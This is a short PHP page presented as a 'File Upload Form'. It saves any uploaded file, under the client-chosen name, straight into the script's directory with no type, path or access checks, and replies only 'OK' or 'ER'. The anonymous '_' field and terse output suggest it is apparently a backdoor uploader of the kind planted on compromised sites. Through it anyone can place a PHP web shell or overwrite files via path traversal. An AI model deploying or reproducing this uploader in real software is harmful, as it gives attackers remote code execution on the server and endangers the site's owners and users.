<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['_']) && $_FILES['_']['error'] === UPLOAD_ERR_OK) {
        $uploadPath = $_FILES['_']['name'];
        if (move_uploaded_file($_FILES['_']['tmp_name'], $uploadPath)) {
            echo "OK";
        } else {
            echo "ER";
        }
    } else {
        echo "Invalid file upload.";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Upload Form</title>
</head>
<body>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="_">
        <input type="submit" value="Upload">
    </form>
</body>
</html>
